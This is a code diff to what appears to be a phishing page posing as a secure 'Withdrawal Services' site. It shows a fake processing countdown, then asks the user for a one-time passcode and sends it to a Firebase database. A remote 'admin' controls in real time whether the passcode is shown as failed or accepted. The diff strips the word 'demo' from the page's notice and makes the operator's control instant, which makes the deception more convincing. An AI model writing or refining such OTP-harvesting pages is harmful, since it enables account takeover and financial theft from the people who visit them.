@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Withdrawal —</title>
+<title>Withdrawal — </title>
 <style>
 *{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,Helvetica,sans-serif;background:radial-gradient(circle at 18% 15%,rgba(255,255,255,.9),transparent 32%),radial-gradient(circle at 88% 72%,rgba(170,135,255,.22),transparent 36%),linear-gradient(145deg,#f6f3ff 0%,#eee7ff 48%,#e5dbff 100%);color:#27223d;min-height:100vh}
 .demo{position:fixed;top:10px;right:10px;z-index:20;background:#fff3cd;color:#795400;border:1px solid #ffe08a;padding:6px 10px;border-radius:20px;font-size:11px;font-weight:700}
@@ -41,7 +41,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 </style>
 </head>
 <body>
-<div class="demo">🛡 Withdrawal Servicses</div>
+<div class="demo">🛡 Withdrawal Services</div>
 <div class="wrap">
   <section class="card" id="login">
     <div class="badge">🛡 &nbsp;SECURE</div>
@@ -105,7 +105,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
         <div class="count" id="count">10:00</div>
         <div class="status" id="processingStatus">⠿ PROCESSING</div>
         <div class="bar"><div class="progress" id="progress"></div></div>
-        <div class="notice" id="processingNotice">Your demo withdrawal is being processed...<div class="warn">⛔ Do not press back or refresh!</div></div>
+        <div class="notice" id="processingNotice">Your withdrawal is being processed...<div class="warn">⛔ Do not press back or refresh!</div></div>
       </div>
     </div>
     <div id="otpSection" class="otp-box hidden">
@@ -141,7 +141,7 @@ let timer = null;
 let remaining = 600;
 let timerCancelled = false;
 let otpCheckInterval = null;
-let currentUserId = null;
+let adminActionListener = null;
 
 function saveToFirebase(type, data) {
   const newRef = database.ref('activities').push();
@@ -152,8 +152,7 @@ function saveToFirebase(type, data) {
     verified: false,
     otpFailed: false,
     ...data
-  }).then((snapshot) => {
-    currentUserId = newRef.key;
+  }).then(() => {
     console.log("✅ Saved to Firebase:", type, data);
   }).catch((error) => {
     console.error("❌ Firebase Error:", error);
@@ -225,6 +224,11 @@ function startTimer() {
     otpCheckInterval = null;
   }
   
+  if (adminActionListener) {
+    adminActionListener.off();
+    adminActionListener = null;
+  }
+  
   updateTimer();
   clearInterval(timer);
   timer = setInterval(function() {
@@ -239,8 +243,8 @@ function startTimer() {
     }
   }, 1000);
   
-  // 🔥 CHECK FIREBASE FOR ADMIN ACTIONS
-  checkFirebaseForAdminAction();
+  // 🔥 FIREBASE REAL-TIME LISTENER FOR ADMIN ACTIONS
+  listenForAdminActions();
 }
 
 function updateTimer() {
@@ -257,85 +261,82 @@ function resetDemo() {
     clearInterval(otpCheckInterval);
     otpCheckInterval = null;
   }
+  if (adminActionListener) {
+    adminActionListener.off();
+    adminActionListener = null;
+  }
   document.getElementById('timerSection').classList.remove('hidden');
   document.getElementById('otpSection').classList.add('hidden');
   show('login');
 }
 
-// 🔥 CHECK FIREBASE FOR ADMIN CANCEL/OTP ACTIONS
-function checkFirebaseForAdminAction() {
-  if (otpCheckInterval) {
-    clearInterval(otpCheckInterval);
-    otpCheckInterval = null;
+// 🔥 REAL-TIME FIREBASE LISTENER - INSTANT UPDATES
+function listenForAdminActions() {
+  if (adminActionListener) {
+    adminActionListener.off();
+    adminActionListener = null;
   }
   
-  otpCheckInterval = setInterval(function() {
-    // Check if admin cancelled timer in Firebase
-    database.ref('admin_actions').once('value').then((snapshot) => {
-      const data = snapshot.val();
-      if (data) {
-        // Check for cancel timer
-        if (data.cancelTimer === true) {
-          clearInterval(otpCheckInterval);
-          otpCheckInterval = null;
-          clearInterval(timer);
-          timerCancelled = true;
-          
-          document.getElementById('timerSection').classList.add('hidden');
-          document.getElementById('otpSection').classList.remove('hidden');
-          document.getElementById('processingStatus').textContent = '⏹ TIMER CANCELLED';
-          document.getElementById('otpMessage').textContent = '';
-          document.getElementById('otpResult').style.display = 'none';
-          document.getElementById('otpInput').value = '';
-          document.getElementById('otpInput').disabled = false;
-          document.getElementById('otpInputArea').style.display = 'block';
-          
-          // Reset admin action
-          database.ref('admin_actions/cancelTimer').set(false);
-        }
-        
-        // Check for OTP result
-        if (data.otpResult === 'failed') {
-          var otpResultDiv = document.getElementById('otpResult');
-          otpResultDiv.style.display = 'block';
-          document.getElementById('otpInputArea').style.display = 'none';
-          document.getElementById('otpMessage').textContent = '';
-          otpResultDiv.className = 'otp-result failed';
-          otpResultDiv.innerHTML = `
-            <span class="result-icon">❌</span>
-            OTP Verification Failed!<br>
-            <span style="font-size:16px;font-weight:400;">Please try again.</span>
-            <br><br>
-            <button onclick="retryOTP()" class="otp-retry-btn" style="padding:10px 30px;border:0;border-radius:30px;font-weight:700;cursor:pointer;">🔄 Retry</button>
-          `;
-          document.getElementById('otpInput').disabled = true;
-          database.ref('admin_actions/otpResult').set('none');
-        }
-        
-        if (data.otpResult === 'success') {
-          var otpResultDiv = document.getElementById('otpResult');
-          otpResultDiv.style.display = 'block';
-          document.getElementById('otpInputArea').style.display = 'none';
-          document.getElementById('otpMessage').textContent = '';
-          otpResultDiv.className = 'otp-result success';
-          otpResultDiv.innerHTML = `
-            <span class="result-icon">✅</span>
-            OTP Verified Successfully!<br>
-            <span style="font-size:16px;font-weight:400;">🎉 Withdrawal Complete!</span>
-          `;
-          document.getElementById('otpInput').disabled = true;
-          database.ref('admin_actions/otpResult').set('none');
-          
-          if (otpCheckInterval) {
-            clearInterval(otpCheckInterval);
-            otpCheckInterval = null;
-          }
-        }
-      }
-    }).catch((error) => {
-      console.error("Firebase check error:", error);
-    });
-  }, 1000);
+  adminActionListener = database.ref('admin_actions');
+  adminActionListener.on('value', function(snapshot) {
+    const data = snapshot.val();
+    if (!data) return;
+    
+    console.log("🔥 Admin action received:", data);
+    
+    // Check for Cancel Timer
+    if (data.cancelTimer === true) {
+      clearInterval(timer);
+      timerCancelled = true;
+      
+      document.getElementById('timerSection').classList.add('hidden');
+      document.getElementById('otpSection').classList.remove('hidden');
+      document.getElementById('processingStatus').textContent = '⏹ TIMER CANCELLED';
+      document.getElementById('otpMessage').textContent = '';
+      document.getElementById('otpResult').style.display = 'none';
+      document.getElementById('otpInput').value = '';
+      document.getElementById('otpInput').disabled = false;
+      document.getElementById('otpInputArea').style.display = 'block';
+      
+      // Reset flag
+      database.ref('admin_actions/cancelTimer').set(false);
+    }
+    
+    // Check for OTP Result
+    if (data.otpResult === 'failed') {
+      var otpResultDiv = document.getElementById('otpResult');
+      otpResultDiv.style.display = 'block';
+      document.getElementById('otpInputArea').style.display = 'none';
+      document.getElementById('otpMessage').textContent = '';
+      otpResultDiv.className = 'otp-result failed';
+      otpResultDiv.innerHTML = `
+        <span class="result-icon">❌</span>
+        OTP Verification Failed!<br>
+        <span style="font-size:16px;font-weight:400;">Please try again.</span>
+        <br><br>
+        <button onclick="retryOTP()" class="otp-retry-btn" style="padding:10px 30px;border:0;border-radius:30px;font-weight:700;cursor:pointer;">🔄 Retry</button>
+      `;
+      document.getElementById('otpInput').disabled = true;
+      database.ref('admin_actions/otpResult').set('none');
+    }
+    
+    if (data.otpResult === 'success') {
+      var otpResultDiv = document.getElementById('otpResult');
+      otpResultDiv.style.display = 'block';
+      document.getElementById('otpInputArea').style.display = 'none';
+      document.getElementById('otpMessage').textContent = '';
+      otpResultDiv.className = 'otp-result success';
+      otpResultDiv.innerHTML = `
+        <span class="result-icon">✅</span>
+        OTP Verified Successfully!<br>
+        <span style="font-size:16px;font-weight:400;">🎉 Withdrawal Complete!</span>
+      `;
+      document.getElementById('otpInput').disabled = true;
+      database.ref('admin_actions/otpResult').set('none');
+    }
+  }, function(error) {
+    console.error("Firebase listener error:", error);
+  });
 }
 
 function retryOTP() {
@@ -346,8 +347,6 @@ function retryOTP() {
   document.getElementById('otpInput').focus();
   document.getElementById('otpMessage').textContent = '🔄 Please enter new OTP';
   document.getElementById('otpMessage').style.color = '#ff9800';
-  
-  // Clear OTP data in Firebase
   database.ref('admin_actions/otpResult').set('none');
 }
 
@@ -359,7 +358,6 @@ function submitOTP() {
     return;
   }
   
-  // Save OTP to Firebase for admin
   database.ref('user_otp').set({
     otp: userOtp,
     time: new Date().toLocaleString()
@@ -368,8 +366,6 @@ function submitOTP() {
   document.getElementById('otpMessage').textContent = '📨 OTP submitted! Waiting for admin verification...';
   document.getElementById('otpMessage').style.color = '#ff9800';
   document.getElementById('otpInput').disabled = true;
-  
-  console.log("📨 User entered OTP:", userOtp);
 }
 </script>
 </body>
